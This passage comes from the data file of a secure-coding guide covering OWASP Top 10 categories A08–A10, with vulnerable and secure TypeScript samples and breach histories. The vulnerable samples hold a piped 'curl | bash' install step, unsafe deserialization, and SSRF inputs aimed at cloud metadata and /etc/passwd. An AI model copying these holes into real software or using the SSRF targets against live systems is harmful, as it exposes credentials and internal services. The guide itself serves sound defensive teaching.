- Using libraries from untrusted CDNs or public registries without subresource integrity (SRI) checks
- Insecure deserialization allowing remote code execution or privilege escalation
- CI/CD pipelines without proper access controls, code review requirements, or artifact signing
- Auto-update mechanisms that don't verify cryptographic signatures
- Serialized objects from untrusted sources without validation
- Build processes that pull dependencies from unverified mirrors`,
    impact:
      "Remote code execution, supply chain compromise, unauthorized access, data tampering. One compromised pipeline can affect thousands of downstream deployments.",
    realWorldExample: `The SolarWinds SUNBURST attack (2020) compromised the company's build system, injecting a backdoor into software updates sent to 18,000+ organizations including US government agencies. The malicious code was signed with SolarWinds' legitimate certificate because the build pipeline itself was compromised.

The Codecov bash uploader incident (2021) saw attackers modify a CI script hosted on Codecov's infrastructure. Hundreds of organizations' CI environments leaked secrets (API keys, tokens, credentials) to the attacker for over two months before detection.`,
    vulnerableCode: `// VULNERABLE — Loading scripts from CDN without integrity check
<script src="https://cdn.example.com/library.js"></script>
// If CDN is compromised, malicious code runs in all users' browsers

// VULNERABLE — Deserializing untrusted data
import { deserialize } from 'node-serialize';

app.post('/api/data', (req, res) => {
  // Attacker can craft serialized objects that execute arbitrary code
  const data = deserialize(req.body.payload);
  res.json(data);
});

// VULNERABLE — CI/CD pipeline without integrity checks
// .github/workflows/deploy.yml
// - name: Install dependencies
//   run: |
//     curl -s https://install.example.com/setup.sh | bash  # Never pipe to bash!
//     npm install  # No lockfile integrity check`,
    secureCode: `// SECURE — Subresource Integrity for CDN scripts
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh7..."
  crossorigin="anonymous">
</script>

// SECURE — Use JSON parsing instead of deserialization
app.post('/api/data', (req, res) => {
  // Parse as JSON — safe, no code execution possible
  const schema = z.object({
    name: z.string(),
    value: z.number(),
  });
  const data = schema.parse(req.body);
  res.json(data);
});

// SECURE — CI/CD with integrity verification
// .github/workflows/deploy.yml
// - name: Install dependencies
//   run: |
//     npm ci  # Uses lockfile, fails if lockfile doesn't match
//     npm audit --audit-level=high
//
// - name: Verify artifacts
//   run: |
//     cosign verify --key cosign.pub myregistry/myapp:latest

// SECURE — Signed commits and protected branches
// Branch protection rules:
// - Require pull request reviews (min 2 reviewers)
// - Require signed commits
// - Require status checks to pass
// - No force pushes to main`,
    codeLanguage: "TypeScript / YAML",
    preventionSteps: [
      "Use digital signatures or similar mechanisms to verify software and data comes from the expected source",
      "Ensure npm/pip/Maven dependencies are consumed from trusted repositories, and consider self-hosting a vetted mirror",
      "Use a software supply chain security tool (Sigstore, in-toto, SLSA framework) to verify components",
      "Implement CI/CD pipeline security: signed commits, branch protections, required reviews, artifact signing",
      "Never pipe remote scripts directly to bash (curl | bash); download, verify, then execute",
      "Use npm ci instead of npm install in CI — it enforces lockfile integrity",
      "Avoid sending unserialized/unsigned data to untrusted clients without integrity checks",
      "Implement Subresource Integrity (SRI) for all external scripts and styles",
    ],
    references: [
      { label: "OWASP Software & Data Integrity Failures", url: "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" },
      { label: "CWE-502: Deserialization of Untrusted Data", url: "https://cwe.mitre.org/data/definitions/502.html" },
    ],
    severity: "High",
    cweIds: ["CWE-345", "CWE-353", "CWE-502", "CWE-829"],
  },
  {
    id: "a09-security-logging-monitoring-failures",
    rank: "A09",
    title: "Security Logging and Monitoring Failures",
    shortDescription:
      "Insufficient logging, detection, monitoring, and active response that allows attackers to persist undetected.",
    description: `This category helps detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs at any time:

- Auditable events such as logins, failed logins, and high-value transactions are not logged
- Warnings and errors generate no log or inadequate/unclear log messages
- Logs are only stored locally and not sent to a centralized system
- Alerting thresholds and response escalation processes are not in place
- Penetration testing and scans by DAST tools do not trigger alerts
- The application cannot detect, escalate, or alert for active attacks in real time
- Logs are not protected against tampering or deletion

The average time to detect a breach is 204 days. Without proper logging and monitoring, organizations may not discover a breach for months or ever, allowing attackers to pivot, exfiltrate data, and maintain persistent access.`,
    impact:
      "Inability to detect breaches, security incidents, and attacks. Attackers can maintain persistent access for months. Failure to meet compliance requirements (PCI DSS, HIPAA, SOC 2) that require security monitoring.",
    realWorldExample: `A major retailer was breached for 7 months before detection because security alerts from their monitoring system were ignored. The alerts existed but went to an email inbox that was not effectively monitored. During that time, attackers exfiltrated 40 million credit card numbers and 70 million customer records.

An enterprise application logged authentication events but not authorization failures. An attacker performing IDOR attacks to access other users' data went completely undetected for 4 months because failed authorization attempts generated no alerts.`,
    vulnerableCode: `// VULNERABLE — No logging, no monitoring
app.post('/api/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // No logging of failed attempt!
    // No tracking of source IP!
    // No alerting on suspicious patterns!
  }
  res.json({ token: generateToken(user) });
});

// VULNERABLE — Sensitive data in logs
app.post('/api/payment', async (req, res) => {
  console.log('Payment request:', JSON.stringify(req.body));
  // Logs contain: credit card number, CVV, personal info!
});

// VULNERABLE — Logs only on local disk
// - No centralized logging
// - No log rotation
// - Logs deletable by attacker who gains server access`,
    secureCode: `// SECURE — Comprehensive structured logging
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(),
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
    // Send to centralized logging (SIEM)
    new winston.transports.Http({
      host: 'siem.company.com', port: 443, ssl: true,
    }),
  ],
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email } = req.body;
  const user = await authenticate(email, req.body.password);

  if (!user) {
    logger.warn('Authentication failed', {
      event: 'AUTH_FAILURE',
      email: maskEmail(email),  // Never log full email
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString(),
    });

    // Detect brute force patterns
    const recentFailures = await getRecentFailures(req.ip, 15);
    if (recentFailures > 10) {
      logger.error('Possible brute force attack detected', {
        event: 'BRUTE_FORCE_DETECTED',
        ip: req.ip,
        failureCount: recentFailures,
      });
      await alertSecurityTeam('Brute force attack', { ip: req.ip });
    }

    return res.status(401).json({ error: 'Invalid credentials' });
  }

  logger.info('Authentication successful', {
    event: 'AUTH_SUCCESS',
    userId: user.id,
    ip: req.ip,
    mfaUsed: !!req.body.mfaToken,
  });

  res.json({ token: generateToken(user) });
});

// Helper: Never log sensitive data
function maskEmail(email: string): string {
  const [local, domain] = email.split('@');
  return \`\${local[0]}***@\${domain}\`;
}`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Log all authentication events (success and failure), authorization failures, input validation failures, and high-value transactions",
      "Use structured logging (JSON) with correlation IDs for request tracing",
      "Never log sensitive data: passwords, tokens, credit card numbers, PII",
      "Send logs to a centralized, tamper-evident logging system (SIEM)",
      "Set up automated alerts for suspicious patterns (brute force, impossible travel, privilege escalation attempts)",
      "Ensure log integrity — logs should be append-only and monitored for tampering",
      "Establish an incident response plan and run tabletop exercises regularly",
      "Use DAST and penetration testing outputs to verify that monitoring detects simulated attacks",
    ],
    references: [
      { label: "OWASP Logging & Monitoring Failures", url: "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" },
      { label: "CWE-778: Insufficient Logging", url: "https://cwe.mitre.org/data/definitions/778.html" },
    ],
    severity: "Medium",
    cweIds: ["CWE-117", "CWE-223", "CWE-532", "CWE-778"],
  },
  {
    id: "a10-ssrf",
    rank: "A10",
    title: "Server-Side Request Forgery (SSRF)",
    shortDescription:
      "The application fetches a remote resource without validating the user-supplied URL, allowing attackers to access internal services.",
    description: `SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

As modern web applications provide end-users with convenient features (URL preview, webhook configuration, file import from URL), the incidence of SSRF is increasing. The severity of SSRF is also increasing due to cloud services and the complexity of architectures.

SSRF allows attackers to:
- Access internal services behind firewalls (databases, admin panels, cloud metadata)
- Read cloud metadata endpoints (AWS: http://169.254.169.254, GCP, Azure)
- Scan internal networks and ports from the server's perspective
- Access internal APIs that are not exposed to the internet
- Read local files using file:// protocol
- Perform denial-of-service against internal services

In cloud environments, SSRF is particularly devastating because cloud metadata endpoints often contain IAM credentials, API keys, and service account tokens.`,
    impact:
      "Access to internal services, cloud credentials theft (IAM roles, metadata), internal network scanning, reading internal files, and potentially remote code execution via internal services.",
    realWorldExample: `The 2019 Capital One breach was caused by an SSRF vulnerability in a WAF configuration. The attacker exploited the flaw to access the AWS EC2 metadata service at http://169.254.169.254, retrieved temporary IAM credentials, and used them to access S3 buckets containing 100 million customer records including Social Security numbers and bank account details.

In another case, a webhook feature allowed users to specify a callback URL. An attacker set the URL to http://localhost:6379/ (internal Redis instance), sending Redis commands via the HTTP body to flush the cache and inject malicious data.`,
    vulnerableCode: `// VULNERABLE — No URL validation, fetches any user-supplied URL
app.post('/api/preview', async (req, res) => {
  const { url } = req.body;
  // Attacker sends: http://169.254.169.254/latest/meta-data/iam/
  // Or: http://localhost:3306/ (internal database)
  // Or: file:///etc/passwd
  const response = await fetch(url);
  const data = await response.text();
  res.json({ preview: data });
});

// VULNERABLE — Webhook with no restrictions
app.post('/api/webhooks', authenticate, async (req, res) => {
  const { callbackUrl } = req.body;
  // No validation — can point to internal services
  await saveWebhook(req.user.id, callbackUrl);
  res.json({ message: 'Webhook registered' });
});

// VULNERABLE — Image proxy
app.get('/api/image-proxy', async (req, res) => {
  const imageUrl = req.query.url as string;
  // Fetches any URL from the server's network perspective
  const image = await fetch(imageUrl);
  res.pipe(image.body);
});`,
    secureCode: `// SECURE — Comprehensive URL validation
import { URL } from 'url';
import dns from 'dns/promises';

const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'metadata.google'];
const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const BLOCKED_IP_RANGES = [
  /^10\\./, /^172\\.(1[6-9]|2\\d|3[01])\\./,  // Private
  /^192\\.168\\./, /^169\\.254\\./,             // Private / Link-local
  /^127\\./, /^0\\./,                           // Loopback
];

async function isUrlSafe(inputUrl: string): Promise<boolean> {
  try {
    const parsed = new URL(inputUrl);

    // Check protocol
    if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) return false;

    // Check hostname against blocklist
    if (BLOCKED_HOSTS.some(h => parsed.hostname.includes(h))) return false;

    // Resolve DNS to check for internal IPs (prevent DNS rebinding)
    const addresses = await dns.resolve4(parsed.hostname);
    for (const addr of addresses) {
      if (BLOCKED_IP_RANGES.some(range => range.test(addr))) return false;
    }

    // Block non-standard ports
    const port = parsed.port ? parseInt(parsed.port) : (parsed.protocol === 'https:' ? 443 : 80);
    if (port !== 80 && port !== 443) return false;

    return true;
  } catch {
    return false;
  }
}

app.post('/api/preview', async (req, res) => {
  const { url } = req.body;

  if (!await isUrlSafe(url)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }

  const controller = new AbortController();
  setTimeout(() => controller.abort(), 5000); // Timeout

  const response = await fetch(url, {
    signal: controller.signal,
    redirect: 'error',  // Don't follow redirects (could redirect to internal)
  });

  // Only allow safe content types
  const contentType = response.headers.get('content-type') || '';
  if (!contentType.startsWith('text/html') && !contentType.startsWith('application/json')) {
    return res.status(400).json({ error: 'Unsupported content type' });
  }

  const data = await response.text();
  res.json({ preview: data.substring(0, 5000) }); // Limit response size
});`,
    codeLanguage: "TypeScript",
    preventionSteps: [
      "Validate and sanitize all user-supplied URLs on the server side",
      "Enforce URL allowlists: only permit requests to known, trusted domains",
      "Block requests to private and reserved IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x)",
      "Block access to cloud metadata endpoints (169.254.169.254) at the firewall or application level",
      "Disable HTTP redirects in server-side URL fetching to prevent redirect-based SSRF",
      "Use DNS resolution validation to prevent DNS rebinding attacks",
      "Deploy network segmentation — URL-fetching services should have minimal internal access",
      "Use IMDSv2 (Instance Metadata Service v2) on AWS to require session tokens for metadata access",
    ],
    references: [
      { label: "OWASP SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
      { label: "CWE-918: Server-Side Request Forgery", url: "https://cwe.mitre.org/data/definitions/918.html" },
    ],
    severity: "High",
    cweIds: ["CWE-918"],
  },
];
